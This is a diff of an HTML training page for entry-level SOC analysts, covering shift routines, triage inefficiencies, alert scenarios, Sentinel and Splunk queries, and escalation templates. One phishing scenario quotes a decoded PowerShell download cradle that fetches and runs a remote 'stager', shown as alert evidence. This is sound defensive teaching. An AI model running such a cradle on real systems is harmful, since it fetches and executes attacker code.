@@ -7,256 +7,397 @@
     <title>L1 SOC Operations | SOC Compendium</title>
     <link rel="stylesheet" href="css/styles.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .scenario-box { background: var(--card-bg); border-radius: 12px; padding: 1.5rem; margin: 1.5rem 0; border-left: 4px solid var(--accent-primary); }
+        .scenario-box h4 { margin-top: 0; color: var(--accent-primary); }
+        .alert-example { background: #1a1a2e; border-radius: 8px; padding: 1rem; margin: 1rem 0; font-family: var(--font-mono); font-size: 0.85rem; overflow-x: auto; }
+        .inefficiency-box { background: rgba(239, 68, 68, 0.1); border-left: 4px solid #ef4444; padding: 1rem; margin: 1rem 0; }
+        .inefficiency-box h4 { margin-top: 0; color: #ef4444; }
+        .solution-box { background: rgba(34, 197, 94, 0.1); border-left: 4px solid #22c55e; padding: 1rem; margin: 1rem 0; }
+        .solution-box h4 { margin-top: 0; color: #22c55e; }
+        .mistake-card { background: var(--bg-secondary); border-radius: 8px; padding: 1rem; margin: 0.75rem 0; }
+        .mistake-card h5 { color: #ef4444; margin: 0 0 0.5rem 0; }
+        .correct-card { background: var(--bg-secondary); border-radius: 8px; padding: 1rem; margin: 0.75rem 0; border-left: 3px solid #22c55e; }
+        .correct-card h5 { color: #22c55e; margin: 0 0 0.5rem 0; }
+        .time-tag { display: inline-block; background: var(--accent-primary); color: white; padding: 0.2rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin-left: 0.5rem; }
+    </style>
 </head>
 <body>
     <nav class="main-nav">
-        <a href="pages/soc-operations/index.html" class="nav-brand"><div class="brand-icon"><i class="fas fa-shield-halved"></i></div><div class="brand-text"><span class="brand-title">SOC Compendium</span><span class="brand-subtitle">Detection &amp; Operations</span></div></a>
+        <a href="index.html" class="nav-brand"><div class="brand-icon"><i class="fas fa-shield-halved"></i></div><div class="brand-text"><span class="brand-title">SOC Compendium</span><span class="brand-subtitle">Detection & Operations</span></div></a>
     </nav>
     <main class="main-content">
         <div class="content-page">
             <div class="breadcrumb">
-                <a href="pages/soc-operations/index.html">Home</a><span class="separator">/</span>
+                <a href="index.html">Home</a><span class="separator">/</span>
                 <a href="pages/soc-operations/index.html">SOC Operations</a><span class="separator">/</span>
                 <span>L1 Operations</span>
             </div>
 
-            <h1><i class="fas fa-user-check"></i> L1 SOC Analyst Operations</h1>
-            <p class="lead">Complete guide for L1 analysts: daily operations, triage methodology, escalation criteria, and professional development.</p>
-
             <div class="content">
-                <!-- THE L1 ROLE -->
-                <h2 id="role"><i class="fas fa-bullseye"></i> The L1 Analyst Role</h2>
+                <h1><i class="fas fa-user-check"></i> L1 SOC Analyst Operations</h1>
+                <p class="lead">Real-world guide for L1 analysts: actual alert scenarios, common inefficiencies to avoid, and practical triage steps.</p>
 
-                <h3>What L1 Is and Isn't</h3>
-                <table>
-                    <thead><tr><th>L1 IS...</th><th>L1 IS NOT...</th></tr></thead>
-                    <tbody>
-                        <tr><td>First line of defense against threats</td><td>Just a button-pusher who closes tickets</td></tr>
-                        <tr><td>Critical filter separating noise from real threats</td><td>Someone who should investigate everything deeply</td></tr>
-                        <tr><td>The eyes and ears of the SOC 24/7</td><td>Expected to know everything immediately</td></tr>
-                        <tr><td>Foundation for career growth</td><td>A dead-end job</td></tr>
-                    </tbody>
-                </table>
+                <!-- TABLE OF CONTENTS -->
+                <div class="info-box">
+                    <div class="info-box-title"><i class="fas fa-list"></i> What's Covered</div>
+                    <ol>
+                        <li><a href="#real-day">A Real Day in the SOC</a></li>
+                        <li><a href="#inefficiencies">Common Inefficiencies</a></li>
+                        <li><a href="#alert-scenarios">Real Alert Scenarios</a></li>
+                        <li><a href="#mistakes">Common L1 Mistakes</a></li>
+                        <li><a href="#tool-triage">Tool-Specific Triage</a></li>
+                        <li><a href="#escalation">Escalation Guide</a></li>
+                    </ol>
+                </div>
 
-                <h3>Why L1 Matters</h3>
-                <div class="info-box info">
-                    <div class="info-box-title"><i class="fas fa-lightbulb"></i> Your Impact</div>
-                    <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
-                        <li><strong>You catch attacks early</strong> - Before they become breaches</li>
-                        <li><strong>You protect the business</strong> - Every correct escalation potentially prevents disaster</li>
-                        <li><strong>You free up senior analysts</strong> - So they can focus on advanced threats</li>
-                        <li><strong>You learn the fundamentals</strong> - Building blocks for security career</li>
+                <!-- SECTION 1: A REAL DAY -->
+                <h2 id="real-day"><i class="fas fa-sun"></i> A Real Day in the SOC</h2>
+
+                <p>Here's what an actual L1 shift looks like - not the textbook version:</p>
+
+                <div class="scenario-box">
+                    <h4>🌅 08:00 - Shift Start</h4>
+                    <p><strong>What actually happens:</strong></p>
+                    <ul>
+                        <li>Night shift analyst is tired, gives you a rushed 2-minute verbal handoff</li>
+                        <li>There are 47 alerts in queue (23 from overnight)</li>
+                        <li>One incident is "still being monitored" but no update in 4 hours</li>
+                        <li>Your SIEM is slow because someone ran a massive historical query</li>
+                    </ul>
+                    <p><strong>What you should do:</strong></p>
+                    <ol>
+                        <li>Check the handoff notes document (not just verbal)</li>
+                        <li>Scan queue for any CRITICAL/HIGH severity first</li>
+                        <li>Check the "monitored incident" in ticketing system for updates</li>
+                        <li>Start with oldest HIGH alerts to avoid SLA breach</li>
+                    </ol>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>🔔 09:30 - Alert Storm</h4>
+                    <p><strong>What actually happens:</strong></p>
+                    <ul>
+                        <li>Suddenly 200+ alerts fire in 10 minutes</li>
+                        <li>All "Suspicious PowerShell Execution" from different hosts</li>
+                        <li>Manager asks "what's happening?"</li>
+                    </ul>
+                    <p><strong>What you should do:</strong></p>
+                    <ol>
+                        <li><strong>Don't panic</strong> - Alert storms are usually: real incident OR misconfigured rule/deployment</li>
+                        <li>Check: Are these the SAME alert? Same time? Same source?</li>
+                        <li>Quick query to find pattern:</li>
+                    </ol>
+                    <div class="alert-example">
+<pre>// Sentinel - Find what's causing the storm
+SecurityAlert
+| where TimeGenerated > ago(30m)
+| summarize Count=count() by AlertName, bin(TimeGenerated, 5m)
+| order by Count desc</pre>
+                    </div>
+                    <p>If all from same source → likely IT activity (patching, SCCM deployment)</p>
+                    <p>If spreading across many hosts → escalate as potential incident</p>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>☕ 11:00 - The "Urgent" VIP Request</h4>
+                    <p><strong>What actually happens:</strong></p>
+                    <ul>
+                        <li>IT manager calls: "CEO got a phishing email, need investigation NOW"</li>
+                        <li>You have 30 alerts in queue</li>
+                        <li>Turns out it was a legitimate email the CEO didn't recognize</li>
+                    </ul>
+                    <p><strong>What you should do:</strong></p>
+                    <ol>
+                        <li>Ask: "Did they click anything? Download anything? Enter credentials?"</li>
+                        <li>If NO to all → lower priority, check email headers when you can</li>
+                        <li>If YES to any → escalate immediately as incident</li>
+                        <li>Log the request even if it's nothing - documents your workload</li>
+                    </ol>
+                </div>
+
+                <!-- SECTION 2: COMMON INEFFICIENCIES -->
+                <h2 id="inefficiencies"><i class="fas fa-clock"></i> Common Inefficiencies</h2>
+
+                <p>These are real problems that slow down SOC teams:</p>
+
+                <div class="inefficiency-box">
+                    <h4>❌ Inefficiency #1: Investigating Known False Positives</h4>
+                    <p><strong>Problem:</strong> Analyst spends 10 minutes on an alert, determines it's backup software running at 2 AM. This happens every night. Every analyst investigates it fresh.</p>
+                    <p><strong>Time wasted:</strong> 10 min × 365 days = 60+ hours/year per analyst</p>
+                </div>
+                <div class="solution-box">
+                    <h4>✓ Solution: Document FP Patterns</h4>
+                    <ul>
+                        <li>Create searchable "Known FP" wiki/document</li>
+                        <li>Before investigating, search for alert name in FP docs</li>
+                        <li>When you find recurring FP, document it AND request tuning</li>
                     </ul>
                 </div>
 
-                <!-- DAILY OPERATIONS -->
-                <h2 id="daily-ops"><i class="fas fa-calendar-day"></i> Daily Operations</h2>
+                <div class="inefficiency-box">
+                    <h4>❌ Inefficiency #2: Re-investigating Same User</h4>
+                    <p><strong>Problem:</strong> Alert for "John Smith suspicious login." L1 investigates, closes as legitimate travel. Next day, same alert (John still traveling). Different L1 investigates from scratch.</p>
+                </div>
+                <div class="solution-box">
+                    <h4>✓ Solution: Check Recent History First</h4>
+                    <div class="alert-example">
+<pre>// Check if user was recently investigated
+SecurityAlert
+| where TimeGenerated > ago(7d)
+| where Entities contains "john.smith"
+| project TimeGenerated, AlertName, Status
+| order by TimeGenerated desc</pre>
+                    </div>
+                </div>
 
-                <h3>Shift Workflow</h3>
-                <table>
-                    <thead><tr><th>Phase</th><th>Actions</th><th>Why</th><th>Time</th></tr></thead>
-                    <tbody>
-                        <tr>
-                            <td><strong>Shift Start</strong></td>
-                            <td>Read handoff notes, check open tickets, note any ongoing incidents</td>
-                            <td>Know what's in progress, don't miss critical context</td>
-                            <td>15-30 min</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Queue Check</strong></td>
-                            <td>Review alert queue, identify any critical/aged alerts</td>
-                            <td>Prioritize correctly, meet SLAs</td>
-                            <td>10 min</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Triage Loop</strong></td>
-                            <td>Work alerts one by one: assess, investigate briefly, decide</td>
-                            <td>Systematic processing prevents missing threats</td>
-                            <td>Ongoing</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Documentation</strong></td>
-                            <td>Document findings in ticket as you work</td>
-                            <td>Audit trail, helps L2 if escalated, knowledge sharing</td>
-                            <td>With each alert</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Shift End</strong></td>
-                            <td>Write handoff notes, flag pending items</td>
-                            <td>Next shift needs context</td>
-                            <td>15-30 min</td>
-                        </tr>
-                    </tbody>
-                </table>
+                <div class="inefficiency-box">
+                    <h4>❌ Inefficiency #3: Writing Novels in Tickets</h4>
+                    <p><strong>Problem:</strong> Analyst writes 500-word essay for a simple false positive. Takes 15 min to document a 2-min triage.</p>
+                </div>
+                <div class="solution-box">
+                    <h4>✓ Solution: Use Templates</h4>
+                    <div class="alert-example">
+<pre>Status: False Positive
+Reason: Scheduled backup activity
+Evidence: Process matches Veeam agent, runs nightly 02:00
+Action: None
+Recommend: Exclude Veeam from this rule</pre>
+                    </div>
+                </div>
 
-                <h3>Time Management</h3>
-                <table>
-                    <thead><tr><th>Alert Type</th><th>Target Triage Time</th><th>If Taking Longer...</th></tr></thead>
-                    <tbody>
-                        <tr><td>Known FP pattern</td><td>2-3 minutes</td><td>You should know these quickly; create documentation if pattern is new</td></tr>
-                        <tr><td>Standard alert</td><td>5-10 minutes</td><td>Normal; check basics, make decision</td></tr>
-                        <tr><td>Complex alert</td><td>15-20 minutes</td><td>If you can't determine in 20 min, escalate with your findings</td></tr>
-                        <tr><td>Obvious true positive</td><td>5 minutes</td><td>Escalate fast, don't spend time proving what's obvious</td></tr>
-                    </tbody>
-                </table>
-
-                <!-- TRIAGE METHODOLOGY -->
-                <h2 id="triage"><i class="fas fa-filter"></i> Triage Methodology</h2>
-
-                <h3>The 5-Minute Triage</h3>
-                <div class="info-box info">
-                    <div class="info-box-title"><i class="fas fa-stopwatch"></i> What to Check in Order</div>
+                <div class="inefficiency-box">
+                    <h4>❌ Inefficiency #4: Wrong Queue Order</h4>
+                    <p><strong>Problem:</strong> 50 alerts in queue. Analyst starts with newest. Meanwhile, HIGH severity alert from 4 hours ago breaches SLA.</p>
+                </div>
+                <div class="solution-box">
+                    <h4>✓ Solution: Priority-Based Order</h4>
                     <table>
-                        <thead><tr><th>#</th><th>Check</th><th>Takes</th><th>Looking For</th></tr></thead>
-                        <tbody>
-                            <tr><td>1</td><td>Read alert fully</td><td>30 sec</td><td>Understand what triggered, severity, affected asset</td></tr>
-                            <tr><td>2</td><td>Is this a known FP?</td><td>30 sec</td><td>Match to documented patterns</td></tr>
-                            <tr><td>3</td><td>Check threat intel / hash reputation</td><td>1 min</td><td>Known bad? Known good?</td></tr>
-                            <tr><td>4</td><td>Context: user, system, time</td><td>1 min</td><td>Who, what, when, does it make sense?</td></tr>
-                            <tr><td>5</td><td>Related activity (process tree, network)</td><td>2 min</td><td>What happened before/after?</td></tr>
-                        </tbody>
+                        <tr><td>1st</td><td>CRITICAL severity (any age)</td></tr>
+                        <tr><td>2nd</td><td>HIGH approaching SLA</td></tr>
+                        <tr><td>3rd</td><td>Oldest MEDIUM alerts</td></tr>
+                        <tr><td>4th</td><td>New alerts</td></tr>
                     </table>
                 </div>
 
-                <h3>Triage Outcomes</h3>
-                <table>
-                    <thead><tr><th>Outcome</th><th>When to Choose</th><th>Documentation Required</th></tr></thead>
-                    <tbody>
-                        <tr>
-                            <td style="color: #3fb950;"><strong>Close as FP</strong></td>
-                            <td>Confirmed legitimate activity, matches FP pattern</td>
-                            <td>What you checked, why it's legitimate</td>
-                        </tr>
-                        <tr>
-                            <td style="color: #d29922;"><strong>Close as True Positive (Handled)</strong></td>
-                            <td>Real threat but already blocked, no further action needed</td>
-                            <td>What was blocked, verified no impact</td>
-                        </tr>
-                        <tr>
-                            <td style="color: #f0883e;"><strong>Escalate to L2</strong></td>
-                            <td>Real threat needing investigation, or unsure after triage</td>
-                            <td>Everything you found, why you're escalating</td>
-                        </tr>
-                        <tr>
-                            <td style="color: #f85149;"><strong>Escalate as Incident</strong></td>
-                            <td>Confirmed active threat, needs immediate response</td>
-                            <td>Critical findings, affected systems, immediate actions taken</td>
-                        </tr>
-                    </tbody>
-                </table>
+                <!-- SECTION 3: REAL ALERT SCENARIOS -->
+                <h2 id="alert-scenarios"><i class="fas fa-bell"></i> Real Alert Scenarios</h2>
 
-                <!-- ESCALATION GUIDE -->
-                <h2 id="escalation"><i class="fas fa-arrow-up"></i> When and How to Escalate</h2>
-
-                <h3>Escalation Decision Framework</h3>
-                <div class="info-box warning">
-                    <div class="info-box-title"><i class="fas fa-question-circle"></i> Should I Escalate?</div>
-                    <table>
-                        <thead><tr><th>Situation</th><th>Action</th><th>Rationale</th></tr></thead>
-                        <tbody>
-                            <tr><td>Clear true positive, active threat</td><td style="color: #f85149;"><strong>Escalate immediately</strong></td><td>Speed matters, get experts involved</td></tr>
-                            <tr><td>Can't determine if FP or TP after 20 min</td><td style="color: #f0883e;"><strong>Escalate with findings</strong></td><td>Don't sit on it; your findings help L2</td></tr>
-                            <tr><td>Above your skill level</td><td style="color: #f0883e;"><strong>Escalate</strong></td><td>Better to ask than to miss something</td></tr>
-                            <tr><td>High-value target (admin, exec, server)</td><td style="color: #f0883e;"><strong>Lower threshold to escalate</strong></td><td>Higher stakes warrant extra review</td></tr>
-                            <tr><td>Clear FP, documented pattern</td><td style="color: #3fb950;"><strong>Don't escalate</strong></td><td>Handle it yourself, that's your job</td></tr>
-                            <tr><td>Unsure but low-impact system</td><td style="color: #d29922;"><strong>Investigate a bit more first</strong></td><td>Build skills, but don't spend too long</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <h3>How to Escalate Well</h3>
-                <table>
-                    <thead><tr><th>Do</th><th>Don't</th></tr></thead>
-                    <tbody>
-                        <tr><td>Include all relevant alert details</td><td>Just forward the raw alert with no context</td></tr>
-                        <tr><td>Document what you already checked</td><td>Make L2 repeat your work</td></tr>
-                        <tr><td>Explain why you're escalating</td><td>"I don't know" with no detail</td></tr>
-                        <tr><td>Provide your assessment (even if unsure)</td><td>Have no opinion at all</td></tr>
-                        <tr><td>Include relevant IOCs and artifacts</td><td>Make L2 hunt for basic info</td></tr>
-                        <tr><td>Note time sensitivity if applicable</td><td>Treat everything as same urgency</td></tr>
-                    </tbody>
-                </table>
-
-                <!-- COMMON CHALLENGES -->
-                <h2 id="challenges"><i class="fas fa-exclamation-triangle"></i> Common Challenges and Solutions</h2>
-
-                <table>
-                    <thead><tr><th>Challenge</th><th>Why It Happens</th><th>Solution</th></tr></thead>
-                    <tbody>
-                        <tr>
-                            <td><strong>Alert fatigue</strong></td>
-                            <td>Too many alerts, too many FPs</td>
-                            <td>Flag repetitive FPs for tuning, take short breaks, rotate alert types</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Afraid to escalate</strong></td>
-                            <td>Fear of being wrong or bothering L2</td>
-                            <td>L2 would rather review than miss something. Escalate with findings.</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Closing too quickly</strong></td>
-                            <td>Pressure to clear queue, overconfidence</td>
-                            <td>Follow checklist every time, quality over speed</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Getting stuck on one alert</strong></td>
-                            <td>Trying to fully investigate at L1 level</td>
-                            <td>Time-box yourself. Can't decide in 20 min? Escalate.</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Missing context</strong></td>
-                            <td>Don't know the environment well enough</td>
-                            <td>Keep notes on environment, ask questions, build knowledge</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Night shift fatigue</strong></td>
-                            <td>Humans aren't nocturnal</td>
-                            <td>Stay active, proper lighting, strategic caffeine, take breaks</td>
-                        </tr>
-                    </tbody>
-                </table>
-
-                <!-- PROFESSIONAL DEVELOPMENT -->
-                <h2 id="development"><i class="fas fa-graduation-cap"></i> Growing as an L1 Analyst</h2>
-
-                <h3>Skills to Develop</h3>
-                <table>
-                    <thead><tr><th>Skill</th><th>Why Important</th><th>How to Develop</th></tr></thead>
-                    <tbody>
-                        <tr><td><strong>Query languages (KQL/SPL)</strong></td><td>Find data faster, custom investigations</td><td>Practice daily, study examples, take training</td></tr>
-                        <tr><td><strong>OS fundamentals</strong></td><td>Understand what's normal vs. suspicious</td><td>Build home lab, study processes, read documentation</td></tr>
-                        <tr><td><strong>Network basics</strong></td><td>Understand traffic, protocols, anomalies</td><td>Wireshark practice, networking courses</td></tr>
-                        <tr><td><strong>Attack techniques</strong></td><td>Know what you're looking for</td><td>MITRE ATT&CK study, CTFs, threat reports</td></tr>
-                        <tr><td><strong>Communication</strong></td><td>Escalations, reports, stakeholder interaction</td><td>Write clear tickets, get feedback, practice</td></tr>
-                    </tbody>
-                </table>
-
-                <h3>Path to L2</h3>
-                <table>
-                    <thead><tr><th>Milestone</th><th>How to Demonstrate</th></tr></thead>
-                    <tbody>
-                        <tr><td>Consistently accurate triage</td><td>Low FP rate, few missed TPs, quality escalations</td></tr>
-                        <tr><td>Can handle complex alerts with guidance</td><td>L2 doesn't need to explain basics to you</td></tr>
-                        <tr><td>Proactively learns and documents</td><td>Creates documentation, shares knowledge</td></tr>
-                        <tr><td>Good communication skills</td><td>Clear tickets, good escalations, helpful handoffs</td></tr>
-                        <tr><td>Beginning to think like an investigator</td><td>Asks good questions, considers attack chains</td></tr>
-                    </tbody>
-                </table>
-
-                <!-- QUICK REFERENCE -->
-                <h2 id="quick-ref"><i class="fas fa-clipboard-list"></i> Quick Reference Card</h2>
-
-                <div class="info-box success">
-                    <div class="info-box-title">L1 Daily Checklist</div>
-                    <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
-                        <li>☐ Read shift handoff notes</li>
-                        <li>☐ Check for any critical/aged alerts</li>
-                        <li>☐ Work alert queue systematically</li>
-                        <li>☐ Document every alert disposition</li>
-                        <li>☐ Escalate promptly when needed</li>
-                        <li>☐ Note any new FP patterns for tuning</li>
-                        <li>☐ Write clear handoff notes for next shift</li>
+                <div class="scenario-box">
+                    <h4>Scenario A: "Multiple Failed Sign-ins" <span class="time-tag">5-7 min</span></h4>
+                    <div class="alert-example">
+<pre>Alert: Multiple failed sign-in attempts
+User: sarah.jones@company.com
+Source IPs: 185.220.101.42, 185.220.101.43
+Failures: 47 in 10 minutes
+Time: 03:24 AM</pre>
+                    </div>
+                    
+                    <p><strong>Step 1: Context (1 min)</strong></p>
+                    <ul>
+                        <li>Is this a real user? → Check AD/Entra</li>
+                        <li>Time 03:24 AM - normal for this user? → Probably not</li>
+                        <li>Multiple source IPs - legitimate? → No, suspicious</li>
                     </ul>
+
+                    <p><strong>Step 2: IP Reputation (1 min)</strong></p>
+                    <div class="alert-example">
+<pre>ThreatIntelligenceIndicator
+| where NetworkIP == "185.220.101.42"
+| project Description, ThreatType</pre>
+                    </div>
+                    <p>→ Known Tor exit node</p>
+
+                    <p><strong>Step 3: Any success? (1 min)</strong></p>
+                    <div class="alert-example">
+<pre>SigninLogs
+| where TimeGenerated > ago(24h)
+| where UserPrincipalName == "sarah.jones@company.com"
+| where ResultType == 0
+| where IPAddress startswith "185.220"</pre>
+                    </div>
+                    <p>→ No successful login from those IPs ✓</p>
+
+                    <p><strong>Decision: True Positive - Blocked</strong></p>
+                    <div class="alert-example">
+<pre>Status: True Positive - Handled
+Analysis: Brute force from Tor exit nodes
+- 47 failed attempts, no success
+- Attack blocked by lockout/CA policy
+Action: None - controls working</pre>
+                    </div>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>Scenario B: "Suspicious PowerShell" <span class="time-tag">10-15 min</span></h4>
+                    <div class="alert-example">
+<pre>Alert: Suspicious PowerShell Command Line
+Host: WKSTN-PC042
+User: mike.wilson
+Command: powershell.exe -enc SQBFAFgAIAAoAE4AZ...
+Parent Process: outlook.exe</pre>
+                    </div>
+
+                    <p><strong>Step 1: Decode command (1 min)</strong></p>
+                    <p>Base64 decodes to: <code>IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/stager')</code></p>
+                    <p>⚠️ This is a download cradle!</p>
+
+                    <p><strong>Step 2: Parent process (30 sec)</strong></p>
+                    <p>Parent is <code>outlook.exe</code> → User clicked something in email = phishing</p>
+
+                    <p><strong>Step 3: Did it connect? (1 min)</strong></p>
+                    <div class="alert-example">
+<pre>DeviceNetworkEvents
+| where DeviceName == "WKSTN-PC042"
+| where RemoteIP == "10.0.0.5"</pre>
+                    </div>
+
+                    <p><strong>Decision: ESCALATE IMMEDIATELY</strong></p>
+                    <div class="alert-example">
+<pre>🚨 ESCALATING TO L2/INCIDENT
+Summary: Phishing compromise on WKSTN-PC042
+- Outlook spawned encoded PowerShell download cradle
+- Target: http://10.0.0.5/stager
+Immediate: Isolate host, check mike.wilson's emails</pre>
+                    </div>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>Scenario C: "Impossible Travel" <span class="time-tag">5 min</span></h4>
+                    <div class="alert-example">
+<pre>Alert: Impossible Travel
+User: david.chen@company.com  
+Login 1: New York, USA at 09:00
+Login 2: London, UK at 09:45</pre>
+                    </div>
+
+                    <p><strong>Common False Positives:</strong></p>
+                    <ul>
+                        <li>VPN - user in NYC but VPN shows UK exit</li>
+                        <li>Mobile roaming - phone using foreign carrier</li>
+                        <li>Cloud app with regional IP</li>
+                    </ul>
+
+                    <p><strong>Check:</strong></p>
+                    <div class="alert-example">
+<pre>SigninLogs
+| where UserPrincipalName == "david.chen@company.com"
+| where TimeGenerated > ago(2h)
+| project TimeGenerated, IPAddress, Location, AppDisplayName, ClientAppUsed</pre>
+                    </div>
+
+                    <p><strong>Decision tree:</strong></p>
+                    <ul>
+                        <li>One IP is corporate VPN → <strong>False Positive</strong></li>
+                        <li>Both unknown external IPs → <strong>Escalate</strong></li>
+                    </ul>
+                </div>
+
+                <!-- SECTION 4: COMMON MISTAKES -->
+                <h2 id="mistakes"><i class="fas fa-exclamation-triangle"></i> Common L1 Mistakes</h2>
+
+                <div class="mistake-card">
+                    <h5>❌ Closing without verifying attack was blocked</h5>
+                    <p>"Malware quarantined" - but did it run first? Did it make connections?</p>
+                </div>
+                <div class="correct-card">
+                    <h5>✓ Always verify the outcome</h5>
+                    <p>Check: process tree, network connections, file changes</p>
+                </div>
+
+                <div class="mistake-card">
+                    <h5>❌ Trusting the username</h5>
+                    <p>"Admin account doing admin things" - but is it really the admin?</p>
+                </div>
+                <div class="correct-card">
+                    <h5>✓ Verify activity makes sense</h5>
+                    <p>Check: time of day, source IP, typical behavior for this user</p>
+                </div>
+
+                <div class="mistake-card">
+                    <h5>❌ Being afraid to escalate</h5>
+                    <p>"Don't want to bother L2 with something that might be nothing"</p>
+                </div>
+                <div class="correct-card">
+                    <h5>✓ Escalate with your findings</h5>
+                    <p>L2 prefers 10 "maybes" over missing 1 real incident. Document what you checked.</p>
+                </div>
+
+                <!-- SECTION 5: TOOL-SPECIFIC -->
+                <h2 id="tool-triage"><i class="fas fa-tools"></i> Tool-Specific Triage</h2>
+
+                <h3>Microsoft Sentinel Quick Queries</h3>
+                <div class="alert-example">
+<pre>// User context
+let user = "john.doe@company.com";
+SigninLogs
+| where TimeGenerated > ago(7d)
+| where UserPrincipalName =~ user
+| summarize Logins=count(), UniqueIPs=dcount(IPAddress), 
+  Failures=countif(ResultType != 0), LastLogin=max(TimeGenerated)</pre>
+                </div>
+
+                <div class="alert-example">
+<pre>// Device activity
+let device = "WKSTN-PC042";
+DeviceProcessEvents
+| where TimeGenerated > ago(1h)
+| where DeviceName =~ device
+| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
+| take 50</pre>
+                </div>
+
+                <h3>Splunk Quick Searches</h3>
+                <div class="alert-example">
+<pre>// User activity
+index=* user="john.doe" earliest=-7d
+| stats count by sourcetype, action, src_ip</pre>
+                </div>
+
+                <div class="alert-example">
+<pre>// Device activity
+index=* host="WKSTN-PC042" earliest=-1h
+| stats count by sourcetype, EventCode</pre>
+                </div>
+
+                <!-- SECTION 6: ESCALATION -->
+                <h2 id="escalation"><i class="fas fa-arrow-up"></i> Escalation Guide</h2>
+
+                <table>
+                    <thead><tr><th>Escalate Immediately</th><th>Escalate After Triage</th><th>Don't Escalate</th></tr></thead>
+                    <tbody>
+                        <tr>
+                            <td>Ransomware indicators<br>Active exfiltration<br>Credential theft<br>C2 confirmed<br>VIP targeted</td>
+                            <td>Unsure after 15-20 min<br>Needs deeper analysis<br>Multiple related alerts<br>New attack technique</td>
+                            <td>Confirmed FP<br>Attack fully blocked<br>Known benign activity<br>Documented exception</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Escalation Template</h3>
+                <div class="alert-example">
+<pre>ESCALATION TO L2
+
+SUMMARY: [One line]
+
+ALERT: [Name, Time, User/Host, Severity]
+
+WHAT I CHECKED:
+- [Check 1]: [Result]
+- [Check 2]: [Result]
+
+WHY ESCALATING:
+[What's suspicious / what you couldn't determine]
+
+URGENCY: [ ] Active threat [ ] Needs analysis [ ] Low</pre>
+                </div>
+
+                <!-- RELATED -->
+                <h2><i class="fas fa-link"></i> Related</h2>
+                <div class="card-grid">
+                    <a href="pages/soc-operations/l2-operations.html" class="card"><div class="card-icon"><i class="fas fa-magnifying-glass"></i></div><h3>L2 Operations</h3><p>After escalation</p></a>
+                    <a href="pages/playbooks/index.html" class="card"><div class="card-icon"><i class="fas fa-book"></i></div><h3>Playbooks</h3><p>Investigation procedures</p></a>
+                    <a href="pages/references/kql-library.html" class="card"><div class="card-icon"><i class="fas fa-terminal"></i></div><h3>KQL Library</h3><p>Ready queries</p></a>
                 </div>
 
             </div>
